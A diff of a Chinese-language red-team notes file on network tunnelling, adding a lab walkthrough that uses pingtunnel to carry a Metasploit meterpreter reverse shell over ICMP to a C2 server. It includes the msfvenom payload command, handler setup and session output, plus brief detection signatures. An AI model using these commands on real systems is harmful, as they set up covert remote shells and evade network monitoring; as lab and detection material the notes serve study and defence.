@@ -174,7 +174,7 @@ Server username: ECHO0D-WIN\echo0d
 
 ![image-20240115153402449](./img/Tunnel/image-20240115153402449.png)
 
-#### 转发TCP上线cobaltstrike
+#### 转发TCP上线cs
 
 * 准备好一个具有公网IP的服务器，root权限运行以下命令，启动ICMP隧道服务端
 
@@ -198,6 +198,57 @@ pingtunnel.exe -type client -l 127.0.0.1:9999 -s icmpserver_ip -t c2_server_ip:7
 
 * 上传生成的beacon到ICMP隧道客户端执行，成功通过反向ICMP隧道上线
 
+#### 转发socks上线msf（失败）
+
+> 按理说是这样的，但是流量里还是有tcp
+
+* 准备好一个具有公网IP的服务器，root权限运行以下命令，启动ICMP隧道服务端
+
+```shell
+./pingtunnel -type server -noprint 1 -nolog 1
+```
+
+ICMP隧道客户端（即需要通过ICMP隧道上线的主机）执行以下命令即可成功创建反向ICMP隧道
+
+```shell
+pingtunnel.exe -type client -l 127.0.0.1:6688 -s icmpserver_ip -sock5 1 -nolog 1 -noprint 1
+# 该命令的意思是icmp隧道客户端监听127.0.0.1:6688启动socks5服务，通过连接到icmpserver_ip的icmp隧道，由icmpserver转发socks5代理请求到目的地址
+# icmpserver_ip 192.168.1.10
+```
+
+生成支持socks5代理的反向payload的meterpreter并上传到ICMP隧道客户端执行即可上线
+
+```shell
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=c2_server_ip LPORT=8443 HttpProxyType=SOCKS HttpProxyHost=127.0.0.1 HttpProxyPort=6688 -f exe -o meterpreter.exe
+# c2_server_ip 192.168.1.10
+```
+
+启动msf监听，等待meterpreter执行上线
+
+```
+msf6 > use exploit/multi/handler
+msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set lhost 0.0.0.0
+lhost => 0.0.0.0
+msf6 exploit(multi/handler) > set lport 6688
+lport => 6688
+msf6 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 0.0.0.0:6688 
+[*] Sending stage (200774 bytes) to 192.168.1.11
+[*] Meterpreter session 4 opened (192.168.1.10:6688 -> 192.168.1.11:59957) at 2024-01-16 02:17:38 -0500
+
+meterpreter > getuid
+Server username: ECHO0D-WIN\echo0d
+```
+
+![image-20240116152131909](./img/Tunnel/image-20240116152131909.png)
+
+此处不确定是否成功，因为夹杂了TCP
+
+![image-20240116153846286](./img/Tunnel/image-20240116153846286.png)
+
 #### 流量特征
 
 icmp包长度突然变化，就是有tcp流量要发
@@ -207,6 +258,8 @@ icmp包长度突然变化，就是有tcp流量要发
 以及突然流量包数量变多
 
 ![image-20240109230426359](./img/Tunnel/image-20240109230426359.png)
+
+
 
 ## 2. DNS隧道
 
@@ -468,7 +521,9 @@ chmod 777 shell.elf
 
 
 
+## 3. TCP over HTTP
 
+### 3.1 ABPTTS
 
 
 
